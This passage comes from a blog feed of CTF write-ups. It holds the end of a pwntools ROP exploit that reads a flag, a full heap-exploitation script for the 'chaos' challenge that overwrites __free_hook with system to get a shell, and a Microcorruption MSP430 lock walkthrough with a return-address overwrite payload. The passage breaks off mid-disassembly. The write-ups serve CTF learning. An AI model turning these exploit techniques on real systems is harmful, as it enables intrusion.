class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./pwn&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&#x27;Welcome! What is your name?&#x27;</span>)</span><br><span class="line">    sd(<span class="string">&#x27;%27$paaaa%28$pbbbb%39$pcccc&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    echo(<span class="string">&#x27;CANARY:&#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">    ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    rbp = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x50</span></span><br><span class="line">    echo(<span class="string">&#x27;RBP:&#x27;</span> + <span class="built_in">hex</span>(rbp))</span><br><span class="line">    ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    leak = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;cccc&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">240</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    echo(<span class="string">&#x27;LIBC BASE:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">    libc_base = leak</span><br><span class="line">    <span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    read = libc_base + <span class="number">0x0F7336</span> </span><br><span class="line">    echo(<span class="string">&#x27;read:&#x27;</span> + <span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">    write = libc_base + <span class="number">0xF738D</span></span><br><span class="line">    puts = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = libc_base + <span class="number">0x0000000000021112</span></span><br><span class="line">    pop_rsi_ret = libc_base + <span class="number">0x00000000000202f8</span></span><br><span class="line">    pop_rdx_ret = libc_base + <span class="number">0x0000000000001b92</span></span><br><span class="line">    pop_rax_ret = libc_base + <span class="number">0x000000000003a738</span></span><br><span class="line">    pop_rdx_rsi_ret = libc_base + <span class="number">0x115189</span></span><br><span class="line">    pop_rdx_r10_ret = libc_base + <span class="number">0x115164</span></span><br><span class="line">    ret = <span class="number">0x115167</span></span><br><span class="line">    syscall_ret = libc_base + <span class="number">0x00000000000bc3f5</span></span><br><span class="line"></span><br><span class="line">    flag_address = rbp - <span class="number">0x70</span></span><br><span class="line">    buf = libc_base + <span class="number">0x3C6620</span>  <span class="comment"># libc bss</span></span><br><span class="line">    ptr = <span class="number">0x400740</span></span><br><span class="line">    stake = libc_base + <span class="number">0x20920</span></span><br><span class="line">    </span><br><span class="line">    rop = p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">    rop += p64(pop_rdi_ret) + p64(flag_address) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(syscall_ret)</span><br><span class="line">    rop += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">    rop += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(buf) + p64(pop_rdx_ret) + p64(<span class="number">0x30</span>) + p64(syscall_ret)</span><br><span class="line">    rop += p64(pop_rax_ret) + p64(<span class="number">1</span>) </span><br><span class="line">    rop += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(buf) + p64(pop_rdx_ret) + p64(<span class="number">0x30</span>) + p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">    filename = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">    padding = <span class="number">0x68</span> - <span class="built_in">len</span>(filename)</span><br><span class="line"></span><br><span class="line">    payload = filename</span><br><span class="line">    payload += <span class="string">&#x27;\x00&#x27;</span> * padding</span><br><span class="line">    payload += p64(canary)</span><br><span class="line">    payload += p64(rbp) + rop</span><br><span class="line">    echo(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    sa(<span class="string">&#x27;?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤©ç¿¼æ¯</title>
      <link href="2021/09/23/%E5%A4%A9%E7%BF%BC%E6%9D%AF/"/>
      <url>2021/09/23/%E5%A4%A9%E7%BF%BC%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h2><p>ä¸€å¤§å †èŠ±é‡Œèƒ¡å“¨çš„é€»è¾‘ï¼Œåˆ†æå‡ºæ¥å°±ä¸éš¾äº†ï¼Œä½†æ˜¯å°±æ˜¯éš¾åœ¨åˆ†æï¼ˆ<br>å°±å‡ºäº†è¿™ä¸€é“é¢˜ï¼Œå¿ƒç´¯<br>ä¸»å‡½æ•°é€»è¾‘å¤§æ¦‚å°±æ˜¯æ„é€ ä¸€ä¸ªopcodeçš„é”®å’Œä¸€ä¸ªpasswdçš„é”®å°±èƒ½ç»•è¿‡å»whileå¾ªç¯ç„¶åè¿›å…¥ä¸‹é¢çš„èœå•é€»è¾‘<br>æ¼æ´åœ¨äºå¯ä»¥æ”¹æ‰sizeï¼Œå®ç°ä¸€ä¸ªç±»ä¼¼äºUAFçš„æ•ˆæœ<br>åˆ©ç”¨æ¼æ´å°±ä¸éš¾äº†ï¼Œæ³„éœ²åœ°å€æ”¹__free_hookå³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./chall&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/1.4_2.27/libc.so.6&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;./libc-2.27.so&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        <span class="comment"># io = gdb.debug(challenge, &#x27;b *$rebase(0x0DB5)&#x27;)</span></span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;8.134.37.86&quot;</span>, <span class="number">29380</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print chall&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span>(<span class="params">menu</span>):</span></span><br><span class="line">    ru(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> menu == <span class="string">&#x27;add&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&#x27;opcode:1\npasswd:Cr4at3x\n\x0a&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> menu == <span class="string">&#x27;edit&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&#x27;opcode:3\npasswd:Ed1tx\n\x0a&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> menu == <span class="string">&#x27;show&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&#x27;opcode:2\npasswd:SH0wx\n\x0a&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> menu == <span class="string">&#x27;free&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&#x27;opcode:4\npasswd:D3l4tex\n\x0a&#x27;</span></span><br><span class="line">    sd(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck_add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    sa(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, content)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck_show</span>(<span class="params">index</span>):</span></span><br><span class="line">    sa(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck_edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    sa(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck_free</span>(<span class="params">index</span>):</span></span><br><span class="line">    sa(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    fuck(<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">    fuck_add(size, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    fuck(<span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">    fuck_show(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    fuck(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">    fuck_free(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    fuck(<span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line">    fuck_edit(index, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x208</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x208</span>) <span class="comment"># 2</span></span><br><span class="line">    add(<span class="number">0x208</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x208</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x208</span>, <span class="string">&#x27;c&#x27;</span> * <span class="number">0x208</span>) <span class="comment"># 0</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">&#x27;b&#x27;</span> * <span class="number">0x208</span>)</span><br><span class="line">    heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) - <span class="number">0x30</span>  <span class="comment"># the first chunk address</span></span><br><span class="line">    echo(<span class="string">&#x27;The First chunk:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        edit(<span class="number">1</span>, <span class="number">0x208</span> * <span class="string">&#x27;a&#x27;</span> + p64(heap + <span class="number">0x30</span>))</span><br><span class="line">        edit(<span class="number">2</span>, p64(<span class="number">0</span>) * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x208</span> * <span class="string">&#x27;a&#x27;</span> + p64(heap + <span class="number">0x70</span>))</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]  <span class="comment"># the first chunk address</span></span><br><span class="line">    echo(<span class="string">&#x27;LIBC:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">    chunk2 = heap + <span class="number">0x270</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1e0</span> / <span class="number">0x20</span>):</span><br><span class="line">        show(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># free(1)</span></span><br><span class="line">    <span class="comment"># edit(0, 0x208 * &#x27;a&#x27; + p64(chunk2))</span></span><br><span class="line">    victim = heap + <span class="number">0x30</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x208</span> * <span class="string">&#x27;a&#x27;</span> + p64(victim))</span><br><span class="line">    edit(<span class="number">0</span>, p64(heap))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        add(<span class="number">0x20</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)    <span class="comment"># 0 -&gt; 2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Notice that the chunk sequence number now needs to be incremented by one</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    dbg()</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x208</span> + p64(chunk2))</span><br><span class="line"></span><br><span class="line">    libc.address = leak</span><br><span class="line">    __free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">2</span>, p64(__free_hook))</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x8</span>, p64(system))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    gdba()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The &quot;Lockitall LockIT Pro&quot; System</title>
      <link href="2021/09/20/Lockitall-LockIT-Pro/"/>
      <url>2021/09/20/Lockitall-LockIT-Pro/</url>
      
        <content type="html"><![CDATA[<p>When I was bored, I was reading an open source book project initiated by the â€œDigital Intelligence Securityâ€ Research Institute, mainly about a manual about iot security, which introduced a smart door lock CTF. <a href="https://microcorruption.com/">Microcorruption</a> is a smart lock online CTF â€œgameâ€ made by Matasano Security and Square. This CTF focuses on embedded security and challenges players to reverse engineer a fictitious â€œLockitall LockIT Proâ€ lock system.</p><p>How it all works:</p><blockquote><p>tl;dr: Given a debugger and a device, find an input that unlocks it. Solve the level with that input.</p><p>Youâ€™ve been given access to a device that controls a lock. Your job: defeat the lock by exploiting bugs in the deviceâ€™s code.</p><p>Youâ€™re playing â€œCapture The Flagâ€. You collect points for each level you beat, working your way through steadily more complicated vulnerabilities. Most levels showcase a single kind of real-world software flaw; some levels chain a series of them together.</p><p>This device has a simple input: you provide a passcode, and if the passcode is correct, the lock unlocks. Just one problem: you donâ€™t know the passcode. Unlock it anyways.</p><p>Weâ€™ve done the tedious work for you: we got the device working, hooked a rudimentary debugger up to it, dumped the code for each level and disassembled it for you.</p><p>Youâ€™ll use the debugger to reverse-engineer the code for each level. You can provide the device with input, then step through the code watching what the device does what that input. Youâ€™re looking for a specific input that unlocks the device. Maybe that input is the correct passcode. More likely, though, itâ€™s something else: an input that exploits a bug in the deviceâ€™s code.</p></blockquote><p>This blog post will record my process of solving door locks in â€œall over the worldâ€. So far I have broken two door locks, both of them are simple, and I am very lazy so I only record from the next door lock :)</p><h2 id="Sydney"><a href="#Sydney" class="headerlink" title="Sydney"></a>Sydney</h2><p>Firstly enter the command â€œcâ€ to let the debugger interrupt where the password is entered, enter a password at random and observe its execution flow in the program.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gun8rkzoo9j61pp0u07bm02.jpg" alt=""></p><p>Enter the command â€œfâ€ to let the pc finish executing the current function and return to the main function. The â€œcheck_passwordâ€ function below should be very interesting.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gun8usn473j61t00u0wo002.jpg" alt=""></p><p>After entering â€œcheck_passwordâ€ function, you can see that there is the following comparision, which compares the two characters starting from the 0th, 2nd, 4th, and 6th digits of our input, respectively.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunyeas2g2j61360s4gqs02.jpg" alt=""></p><p>So the password in hexadecimal should be as follows: 3c31734d51263857. i.e.  â€œ&lt;1sMQ&amp;8Wâ€.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunygvvznij60di04674h02.jpg" alt=""></p><p>Oh my bad, the MSP430 uses the instruction set is a little-endian, so the data in memory still need to swap.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunyrc7ph1j60d003maa802.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunyrzpruhj618o0gw41802.jpg" alt=""></p><h2 id="Hanoi"><a href="#Hanoi" class="headerlink" title="Hanoi"></a>Hanoi</h2><p>The first test is still performed by entering a random password.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunyyhweifj61le0nc45t02.jpg" alt=""></p><p>This function may be of interest to us, go in and take a look.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunz2maweuj61gr0u0th302.jpg" alt=""></p><p>The fution calls another funciton, and notice that the address where we entered the password is also pushed onto the stack before.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunzenacwyj60ri064mxr02.jpg" alt=""></p><p>Looking at the output, it seems that this function just checked the length of the password we entered or something like that.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunzowrp9yj61pu0qcqas02.jpg" alt=""></p><p>The key code seems to be in this position: both to ensure that the password length is between 8 and 16 bits, and that the 17th bit has to do a comparision, which should be the familiar pwn technique.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gunzx809ukj619f0u043s02.jpg" alt=""></p><p>Bypass directly with 00 truncation.</p><h2 id="Cusco"><a href="#Cusco" class="headerlink" title="Cusco"></a>Cusco</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo089j0orj61ko0u0gtr02.jpg" alt=""></p><p>We just noticed that there is an interrupt here and we checked the manual to find the following information:</p><blockquote><p>INT 0x7D.<br>Interface with the HSM-1. Set a flag in memory if the password passed in is correct.<br>Takes two arguments. The first argument is the password to test, the second is the location of a flag to overwrite if the password is correct.</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo1wd4fjvj60oc0b875h02.jpg" alt=""></p><p>The judgment logic of the main function is â€œtest r15â€, but when we go to the place shown in the figure, we find that r15 is always 0. Are we going to hijack the flow of the program?</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo2h30p9sj61na0oeagm02.jpg" alt=""></p><p>Put a segment at the ret of the main function to see if the address of the ret we can control.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo2iupbhqj61iz0u07cn02.jpg" alt=""></p><p>Oh dear, this place is really controllable, then everything is easy, just change the ret address to unlock address directly.</p><p>offset = 0x10</p><p>And the address of unlock:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4528:  b012 4644      call#0x4446 &lt;unlock_door&gt;</span><br></pre></td></tr></table></figure><p>payload = (hex)616161616161616161616161616161614644</p><h2 id="Reykjavik"><a href="#Reykjavik" class="headerlink" title="Reykjavik"></a>Reykjavik</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo2uh7nwgj61gk0ouqad02.jpg" alt=""></p><p>When the password was entered, the pc pointer pointed to a strange location.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo2vw74oej60os09omyj02.jpg" alt=""></p><p>By looking at the main function, it seems that some encryption has been done to the code. Then we will not let the program run first and locate the enc function directly to observe its logic.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo33gc72nj61q00sqthd02.jpg" alt=""></p><p>You can see that the first thing is to loop 0x100 times to fill the memory with this data somewhere. This memory is later processed in various ways, and we jump out of the function to see the result after encryption.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guo3bthsx5j61l00u0na602.jpg" alt=""></p><p>Debug cannot parse the code pointed to by pc, we disassemble it manually.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0b12           pushr11</span><br><span class="line">0412           pushr4</span><br><span class="line">0441           movsp, r4</span><br><span class="line">2452           add#0x4, r4</span><br><span class="line">3150 e0ff      add#0xffe0, sp</span><br><span class="line">3b40 2045      mov#0x4520, r11</span><br><span class="line">073c           jmp$+0x10</span><br><span class="line">1b53           incr11</span><br><span class="line">8f11           sxtr15</span><br><span class="line">0f12           pushr15</span><br><span class="line">0312           push#0x0</span><br><span class="line">b012 6424      call#0x2464</span><br><span class="line">2152           add#0x4, sp</span><br><span class="line">6f4b           mov.b@r11, r15</span><br><span class="line">4f93           tst.br15</span><br><span class="line">f623           jnz$-0x12</span><br><span class="line">3012 0a00      push#0xa</span><br><span class="line">0312           push#0x0</span><br><span class="line">b012 6424      call#0x2464</span><br><span class="line">2152           add#0x4, sp</span><br><span class="line">3012 1f00      push#0x1f</span><br><span class="line">3f40 dcff      mov#0xffdc, r15</span><br><span class="line">0f54           addr4, r15</span><br><span class="line">0f12           pushr15</span><br><span class="line">2312           push#0x2</span><br><span class="line">b012 6424      call#0x2464</span><br><span class="line">3150 0600      add#0x6, sp</span><br><span class="line">b490 1a02 dcff cmp#0x21a, -0x24(r4)</span><br><span class="line">0520           jnz$+0xc</span><br><span class="line">3012 7f00      push#0x7f</span><br><span class="line">b012 6424      call#0x2464</span><br><span class="line">2153           incdsp</span><br><span class="line">3150 2000      add#0x20, sp</span><br><span class="line">3441           popr4</span><br><span class="line">3b41           popr11</span><br><span class="line">3041           ret</span><br><span class="line">1e41 0200      mov0x2(sp), r14</span><br><span class="line">0212           pushsr</span><br><span class="line">0f4e           movr14, r15</span><br><span class="line">8f10           swpbr15</span><br><span class="line">024f           movr15, sr</span><br><span class="line">32d0 0080      bis#0x8000, sr</span><br><span class="line">b012 1000      call#0x10</span><br><span class="line">3241           popsr</span><br><span class="line">3041           ret</span><br><span class="line">d21a 189a      call&amp;0x9a18</span><br><span class="line">22dc           bis@r12, sr</span><br><span class="line">45b9           bit.br9, r5</span><br><span class="line">4279           subc.br9, sr</span><br><span class="line">2d55           add@r5, r13</span><br><span class="line">858e a4a2      subr14, -0x5d5c(r5)</span><br><span class="line">67d7           bis.b@r7, r7</span><br><span class="line">14ae a119      dadd0x19a1(r14), r4</span><br><span class="line">76f6           and.b@r6+, r6</span><br><span class="line">42cb           bic.br11, sr</span><br><span class="line">1c04 0efa      rrc-0x5f2(r12)</span><br><span class="line">a61b           invalid@r6</span><br><span class="line">74a7           dadd.b@r7+, r4</span><br><span class="line">416b           addc.br11, sp</span><br><span class="line">d237           jge$-0x5a</span><br><span class="line">a253 22e4      incd&amp;0xe422</span><br><span class="line">66af           dadd.b@r15, r6</span><br><span class="line">c1a5 938b      dadd.br5, -0x746d(sp)</span><br><span class="line">8971 9b88      subcsp, -0x7765(r9)</span><br><span class="line">fa9b 6674      cmp.b@r11+, 0x7466(r10)</span><br><span class="line">4e21           jnz$+0x29e</span><br><span class="line">2a6b           addc@r11, r10</span><br><span class="line">b143 9151      mov#-0x1, 0x5191(sp)</span><br><span class="line">3dcc           bic@r12+, r13</span><br><span class="line">a6f5 daa7      and@r5, -0x5826(r6)</span><br><span class="line">db3f           jmp$-0x48</span><br><span class="line">8d3c           jmp$+0x11c</span><br><span class="line">4d18           rrc.br13</span><br><span class="line">4736           jge$-0x370</span><br><span class="line">dfa6 459a 2461 dadd.b-0x65bb(r6), 0x6124(r15)</span><br><span class="line">921d 3291      sxt&amp;0x9132</span><br><span class="line">14e6 8157      xor0x5781(r6), r4</span><br><span class="line">b0fe 2ddd      and@r14+, -0x22d3(pc)</span><br><span class="line">400b           retipc</span><br><span class="line">8688 6310      subr8, 0x1063(r6)</span><br><span class="line">3ab3           bit#-0x1, r10</span><br><span class="line">612b           jnc$-0x13c</span><br><span class="line">0bd9           bisr9, r11</span><br><span class="line">483f           jmp$-0x16e</span><br><span class="line">4e04           rrc.br14</span><br><span 